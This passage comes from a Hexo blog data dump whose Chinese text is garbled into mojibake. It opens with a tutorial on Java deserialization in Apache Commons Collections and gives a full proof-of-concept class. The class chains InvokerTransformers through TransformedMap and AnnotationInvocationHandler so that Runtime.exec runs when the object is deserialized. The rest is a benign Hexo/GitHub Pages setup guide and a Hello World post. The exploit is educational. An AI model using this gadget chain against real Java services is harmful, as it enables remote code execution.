ä¸ºSpeakæ–¹æ³•æ²¡æœ‰å½¢å‚ï¼Œæ‰€ä»¥parameterTypesä¸ºnull person.getClass().getMethod(â€œrunâ€, String.class);è·å¾—personå¯¹è±¡çš„runæ–¹æ³•ï¼Œå› ä¸ºrunæ–¹æ³•çš„å½¢å‚æ˜¯Stringç±»å‹çš„ï¼Œæ‰€ä»¥parameterTypesä¸ºString.class Method Class.invoke(Object obj, Objectâ€¦ args)invoke(æŸä¸ªå¯¹è±¡å®ä¾‹ï¼Œ ä¼ å…¥å‚æ•°) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\",String.class).invoke(runtime,\"calc\");ç­‰ä»·äº runtime.exec(\"calc\");è°ƒç”¨ç”Ÿæˆçš„runtimeå®ä¾‹çš„execæ–¹æ³•ï¼Œå¹¶å°†â€clacâ€å‚æ•°ä¼ å…¥exec()æ–¹æ³• å®é™…åˆ©ç”¨ å¯¹è±¡æ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œä½†å¹¶ä¸åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘è°ƒç”¨é“¾ï¼Œè€Œæ˜¯è¦ç»è¿‡è¿­ä»£å™¨è¿­ä»£å¹¶ä¸”ä½¿ç”¨ setValue() æ–¹æ³•æ‰è¡Œï¼Œæ­£å¸¸æƒ…å†µä¸‹åŸºæœ¬ä¸ä¼šæœ‰è¿™ç§åœºæ™¯ã€‚ sun.reflect.annotation.AnnotationInvocationHandlerè¯¥ç±»ä¸­é‡å†™äº†readObjectæ–¹æ³•,åœ¨è¢«è°ƒç”¨æ—¶ä¼šæ‰§è¡ŒsetValueæ“ä½œ, å¦‚æœèƒ½æŠŠTransformedMapè£…å…¥è¿™ä¸ªAnnotationInvocationHandlerç±»å°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œ åˆ©ç”¨ä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class AExec implements Serializable { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map map = new HashMap(); map.put(\"value\", \"value\"); Map transformedMap = TransformedMap.decorate(map, null, transformerChain); Class cl = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(java.lang.annotation.Target.class, transformedMap); //Object instance = ctor.newInstance(java.lang.annotation.Retention.class, transformedMap); //åºåˆ—åŒ– FileOutputStream fileOutputStream = new FileOutputStream(\"serialize3.txt\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(instance); objectOutputStream.close(); //ååºåˆ—åŒ– FileInputStream fileInputStream = new FileInputStream(\"serialize3.txt\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); Object result = objectInputStream.readObject(); objectInputStream.close(); System.out.println(result); }} java.lang.Runtime#exec(java.lang.String)åœ¨execå¤„æ·»åŠ æ–­ç‚¹ æŸ¥çœ‹è°ƒç”¨é“¾ sun.reflect.annotation.AnnotationInvocationHandler#readObject ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° var1 å¿…é¡»ä¸ºç»§æ‰¿Annotationçš„å­ç±»ï¼ŒAnnotationè¿™ä¸ªæ¥å£æ˜¯æ‰€æœ‰æ³¨è§£ç±»å‹çš„å…¬ç”¨æ¥å£ï¼Œæ‰€æœ‰æ³¨è§£ç±»å‹éƒ½å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ java.lang.annotation.Retention.class java.lang.annotation.Target.class å¦åˆ™åœ¨è¿™ä¸ªåœ°æ–¹å°±returnï¼Œä¸ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œäº† ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° var2 åˆ™æ˜¯æ„é€ çš„è°ƒç”¨é“¾åŒæ—¶mapçš„é”®å€¼å¿…é¡»ä¸º\"value\"ï¼Œå¦åˆ™åˆ©ç”¨ä¸æˆåŠŸï¼Œè¿™æ˜¯ä¸€å¤„å°ç»†èŠ‚~ Java ååºåˆ—åŒ–æ¼æ´å§‹æœ«ï¼ˆ1ï¼‰â€” Apache Commonsæµ…æ˜¾æ˜“æ‡‚çš„JAVAååºåˆ—åŒ–å…¥é—¨æ‰‹æŠŠæ‰‹æ•™ä½ å†™JAVAååºåˆ—åŒ–çš„POC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hexoæ­å»ºä¸ªäººåšå®¢","slug":"Hexoæ­å»ºä¸ªäººåšå®¢","date":"2020-08-15T15:54:00.000Z","updated":"2020-09-22T11:46:45.491Z","comments":true,"path":"2020/08/15/Hexoæ­å»ºä¸ªäººåšå®¢/","link":"","permalink":"http://yoursite.com/2020/08/15/Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"æ­å»ºåšå®¢ ç¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js","text":"æ­å»ºåšå®¢ ç¯å¢ƒæ­å»º å®‰è£… Git &amp;&amp; Node.js GitNode.js å®‰è£… Hexo Git å’Œ Node.js å®‰è£…å¥½ä¹‹åï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç”¨äºå­˜æ”¾åšå®¢æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼Œè¿›å…¥æ–‡ä»¶å¤¹åï¼Œå®‰è£…å¹¶ä½¿ç”¨ Hexo ã€‚ 12$ npm install -g hexo-cli$ hexo init å®‰è£…å®Œæˆä¹‹åï¼Œæ–‡ä»¶å¤¹çš„ç›®å½•å¦‚ä¸‹ï¼š |â€”â€”node_modules|â€”â€”public|â€”â€”scaffolds|â€”â€”source|â€”â€”themes|â€”â€”_config.yml|â€”â€”.gitignore|â€”â€”db.json|â€”â€”package.json|â€”â€”package-lock.json ç”Ÿæˆé™æ€åšå®¢æ–‡ä»¶ åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/ å°†åšå®¢éƒ¨ç½²åˆ° Github ä¸Š åˆ›å»ºä»“åº“ åˆ›å»ºä¸€ä¸ªåä¸ºä½ ç”¨æˆ·å.github.ioçš„ä»“åº“ï¼Œ(å¿…é¡»æ˜¯ç”¨æˆ·åï¼Œå…¶ä»–åç§°æ— æ•ˆ),ä»¥åçš„è®¿é—®åœ°å€å°±æ˜¯ http://ç”¨æˆ·å.github.io é…ç½® SSH å¯†é’¥ æŸ¥çœ‹æœ¬æœºæ˜¯å¦å­˜åœ¨ .ssh ç›®å½• 1$ cd ~/.ssh å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€å¯¹æ–°çš„ SSH å¯†é’¥ 123$ssh-keygen -t rsa -C \"your_email@example.com\" # è¿™å°†æŒ‰ç…§ä½ æä¾›çš„é‚®ç®±åœ°å€ï¼Œåˆ›å»ºä¸€å¯¹å¯†é’¥Generating public/private rsa key pair.Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter] æ ¹æ®æç¤ºåˆ°è¾“å…¥å¯†ç å’Œç¡®è®¤å¯†ç  12Enter passphrase (empty for no passphrase): [Type a passphrase]Enter same passphrase again: [Type passphrase again] ç”Ÿæˆ SSH ä¹‹å è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†å…¬é’¥çš„å†…å®¹å¤åˆ¶åˆ°ç³»ç»Ÿç²˜è´´æ¿(clipboard)ä¸­ï¼š 1clip &lt; ~/.ssh/id_rsa.pub ç²˜è´´å…¬é’¥åˆ° github â€“&gt; Settings â€“&gt; SSH keys è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è®¾ç½®æˆåŠŸ 1$ ssh -T git@github.com è®¾ç½®ç”¨æˆ·ä¿¡æ¯ Git ä¼šæ ¹æ®ç”¨æˆ·çš„åå­—å’Œé‚®ç®±æ¥è®°å½•æäº¤ï¼ŒGitHubä¹Ÿæ˜¯ç”¨è¿™äº›ä¿¡æ¯æ¥åšæƒé™çš„å¤„ç†ï¼Œè¾“å…¥ä¸‹é¢çš„ä»£ç è¿›è¡Œä¸ªäººä¿¡æ¯çš„è®¾ç½®ï¼ŒæŠŠåç§°å’Œé‚®ç®±æ›¿ã€‚ 123$ git config --global user.name \"Whippet\" #ç”¨æˆ·å$ git config --global user.email \"Whippet0@qq.com\" #é‚®ç®±$ git config --list #æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ æœ¬åœ°çš„ Hexo æ–‡ä»¶ æ›´æ–°åˆ° Github ç™»é™† Github æ‰¾åˆ°åœ°å€https://github.com/Whippet0/Whippet0.github.io.git å¤åˆ¶è‡³ hexo å®‰è£…ç›®å½•ä¸‹çš„ _config.yml æ–‡ä»¶ä¸­ 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/Whippet0/Whippet0.github.io.git branch: master åœ¨ hexo æ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œ 1234$ hexo g$ hexo dæˆ–è€…$ hexo g -d å¦‚æœ hexo d çš„æ—¶å€™æŠ¥é”™ ERROR Deployer not found: gitæ‰§è¡Œ npm install hexo-deployer-git --save ç„¶åéœ€è¦è¾“å…¥ github çš„è´¦å·å’Œå¯†ç  æˆåŠŸä¹‹åè®¿é—® https://whippet0.github.io/ ç¾åŒ–åšå®¢ è¿›å…¥ hexo ä¸»é¢˜å®˜ç½‘æŒ‘é€‰æˆ‘ä»¬å–œæ¬¢çš„ä¸»é¢˜ï¼Œå¤åˆ¶ä¸»é¢˜çš„åœ°å€https://github.com/Molunerfinn/hexo-theme-melodyæ‰“å¼€Hexoæ–‡ä»¶å¤¹ æŒ‰ç…§ github ä¸Šçš„æç¤ºè¿›è¡Œæ“ä½œ è‹¥æ²¡æœ‰æç¤ºåˆ™ç›´æ¥ git clone è¯¥æ–‡ä»¶å¤¹ã€‚ä¸‹è½½å®Œæˆåï¼Œæ‰“å¼€Hexoæ–‡ä»¶å¤¹ä¸‹çš„é…ç½®æ–‡ä»¶_config.yml ä¿®æ”¹å‚æ•°ä¸ºï¼štheme: melody åœ¨ Git Bash ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š 12$ hexo g # ç”Ÿæˆ$ hexo s # å¯åŠ¨æœåŠ¡ åœ¨æµè§ˆå™¨ä¸­è®¿é—® http://localhost:4000/åœ¨æœ¬åœ°è¿›è¡ŒæŸ¥çœ‹ éƒ¨ç½²ä¸»é¢˜åˆ°github ä¸Š 12hexo clean (å¿…é¡»è¦ï¼Œä¸ç„¶æœ‰æ—¶å› ä¸ºç¼“å­˜é—®é¢˜ï¼ŒæœåŠ¡å™¨æ›´æ–°ä¸äº†ä¸»é¢˜)hexo g -d æœ€åæˆ‘é€‰æ‹©äº†è¿™ä¸ªä¸»é¢˜ stun å› ä¸ºæœ‰é…å¥—çš„ä¸­æ–‡è¯´æ˜ï¼Œæ‰€ä»¥é…ç½®èµ·æ¥å¾ˆæ–¹ä¾¿ã€‚ åŒæ—¶ä¹Ÿå¯ä»¥è®©åšå®¢ä¸Šæ·»åŠ ä¸€äº› Emoji ğŸ‘´ å‘å¸ƒæ–‡ç«  å›¾ç‰‡é…ç½® åœ¨æ ¹ç›®å½•ä¸‹é…ç½®æ–‡ä»¶_config.yml ä¸­ post_asset_folder: trueå®‰è£…æ’ä»¶ 1$ npm install https://github.com/CodeFalling/hexo-asset-image -- save åˆ©ç”¨ hexo n \"æ–‡ç« åç§°\" åœ¨ source\\_postsä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„æ–‡ç« æ—¶ï¼ŒåŒæ—¶ä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªæ–‡ç« åç§°çš„æ–‡ä»¶å¤¹ï¼ŒæŠŠå›¾ç‰‡æ”¾åœ¨æ–‡ç« åç§°æ–‡ä»¶å¤¹ä¸‹ï¼Œåœ¨ markdown ä¸­åˆ©ç”¨å›¾ç‰‡æ—¶æ˜¯éœ€è¦åŠ ä¸Šæ–‡ä»¶å¤¹çš„ç›®å½•ï¼Œä½†æ˜¯ä¸Šä¼ è‡³ github æ—¶ å¹¶ä¸éœ€è¦æ–‡ä»¶å¤¹çš„ç›®å½•ã€‚ç„¶åå°±åˆ©ç”¨ Oah çš„è„šæœ¬ï¼Œè½»æ¾è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2020-08-15T13:31:50.000Z","updated":"2020-09-22T11:46:45.491Z","comments":true,"path":"2020/08/15/hello-world/","link":"","permalink":"http://yoursite.com/2020/08/15/hello-world/","excerpt":"","text":"Hello word ğŸ˜„ ğŸ˜„ ğŸ˜„ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}